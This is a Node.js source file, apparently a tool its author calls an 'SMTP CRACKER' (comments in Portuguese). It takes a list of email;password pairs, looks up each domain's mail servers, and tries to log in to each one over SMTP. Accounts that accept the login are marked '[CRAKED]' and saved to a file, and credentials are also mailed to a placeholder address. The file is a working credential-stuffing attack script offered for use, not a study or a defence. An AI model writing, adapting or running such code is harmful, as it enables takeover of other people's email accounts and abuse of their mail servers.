const dns = require("node:dns");
const dnsPromises = require('node:dns').promises;
const mailer = require('nodemailer');
const utils = require('utils');
const colors = require('colors');
const colorAnsi = require('ansi-colors')
const cliProgress = require('cli-progress');
const EventEmitter = require('events');
const fs = require('fs');
const emitter = new EventEmitter();
emitter.setMaxListeners(0);
//configuracao Timedelay e porta para uma  posivel troca de portas durante teste conexao
//const config = require('./config.json');



function TimeDelay(ms){
  return new Promise(resolve =>{
    setTimeout(()=>{ resolve('')},ms);
  })
}
/*
function buteForce(user,pass,port,line){
  for(let i = 0; i < worldList.length; i++){
    let Wordlist = worldList[i];
    //sendMail(host,Wordlist)
  }
}
*/
async function sendMail(value,stop){

  dns.resolveMx(value.split(";")[2],(err,adresses)=>{
    
      let domain =  value.split(";")[2];
      const user = value.split(";")[0];
      const pass = value.split(";")[1];
      const mailOptions = {
      from: `${user}`,
      to: 'seuemail@dprovedor.com',
      subject: '[SMTP]',
      text: `${user}:${pass}:${domain}`
    }

    const transporter = mailer.createTransport({
      host: `${domain}`,
      port: 465,
      secure: true , //true para porta 465
      auth: {
        user: `${user}`,
        pass: `${pass}`
      },
      tls: {rejectUnauthorized: false}

    });

    transporter.sendMail(mailOptions, function(error,info){
      if(error){
        if(error.code == "EENVELOPE"){
          fs.appendFile(`./output/SMTPs.txt`, `${user}|${pass} - ${domain}` + '\n', () => {});
          //debugar  o pro que  erro de envelope
           console.log(`[ENVELOPE] `.red +  error.code + " | " + domain + ":" + user + ":" + pass + "RESPONSE CODE" + error.responseCode + " #SMTP".red)
        }
        console.log(`[DECLINED] `.red +  error.code + " | " + domain + ":" + user + ":" + pass + " #SMTP".red)

        if(error.code == "ESOCKET" || error.code == "EDNS" || error.code == "EAUTH"){
          console.log(`RETESTANDO`.yellow)
          //reteste recursivo
          //imprementar brute force recursivo caso  erro.code == "EAUTH"
          if(stop < 1){
            ++stop;
            let parseMX = domain.split(".")[0].length;
            //refatorar a ganbirra
            if(parseMX === 3){
              domain = domain.replace(/[a-z0-9.]{4}/,"mail.");
            }
            if(parseMX === 2){
              domain = domain.replace(/[a-z.]{3}/,"mail.");
            }
            if(parseMX === 6){
              domain = domain.replace(/[a-z0-9.]{7}/,"mail.");
            }
            if(parseMX === 4){
              domain = domain.replace(/[a-z0-9.]{5}/,"mail.");
            }
            if(parseMX === 5){
              domain = domain.replace(/[a-z0-9.]{6}/,"mail.");
            }
            //fimda banbiarra
            let value2 = `${user};${pass};${domain}`;
            sendMail(value2)
            //fim reteste
          }
        }

      }else{
        
        console.log(`[CRAKED] `.green +  info.response + domain + ":" + user + ":" + pass + " #SMTP".green[2]);
        fs.appendFile(`./output/SMTPs.txt`, `${user}|${pass} - ${domain}` + '\n', () => {});
      }
     
    })
  });
}


let ArrayAdresses = [];
let ArrayAdressesInvalid = [];
async function resolveMx(smtp){
  let domain = smtp.split(";")[2];
  let user = smtp.split(";")[0];
  let passwd = smtp.split(";")[1];
  //reverso DNS obter lista serviços ATIVOS
  //Imprementar  verificasao SSH
    dns.resolve(domain,'MX',(erro,adresses)=>{

      if(adresses && adresses.length > 0){
       
        adresses.forEach((item)=>{
         console.log(item.exchange)
          ArrayAdresses.push(`${user};${passwd};${item.exchange}`)
        })
       
      }else{
        
        ArrayAdressesInvalid.push(domain)
      }
    });
}





console.log()
const lista = fs.readFileSync('./lista.txt',{encoding: 'utf-8'}).split('\r\n');
const worldList = fs.readFileSync('./worldList.txt',{encoding: 'utf-8'}).split('\r\n');
console.log(fs.readFileSync('./assets/ascii.txt', 'utf-8').toString().rainbow.bold);
console.log()
console.log(`[SMTP CRACKER] carregadas: ${lista.length}`);
console.log("Coder: Andre Luiz use pro sua conta e risco OK!");
console.log();

console.log(`Validando Domain!`)
console.log()
async function Cracksend(){
await TimeDelay(1000);
const barProgress = new cliProgress.SingleBar({
  format: 'Progress |' + colors.cyan('{bar}') + '| {percentage}% || {value}/{total} Chucks || Speed: {speed}',
  barCompleteChar: '\u2588',
  barIncompleteChar: '\u2591',
  hideCursor: true
});
barProgress.start(lista.length,0,{
  speed: "N/A"
});
barProgress.increment();
barProgress.update(lista.length);

  for(let [index , value] of lista.entries() ){

    await TimeDelay(10);

    const smtp = `${value.split(";")[0]};${value.split(";")[1]};${value.split(";")[0].split("@")[1]}`;
    resolveMx(smtp)
    if(index == lista.length){
      barProgress.stop();
      console.log()
    }
   
  }

await TimeDelay(1000);
console.log()
console.log(`Listando Serviços SMTP`)
console.log()
await TimeDelay(1000);
  
  for(let [index,value] of ArrayAdresses.entries()){
    let stop = 0;
    //incia a rachadura shuahsuaaa
    sendMail(value,stop)
    await TimeDelay(500)
     
  }


}
Cracksend()
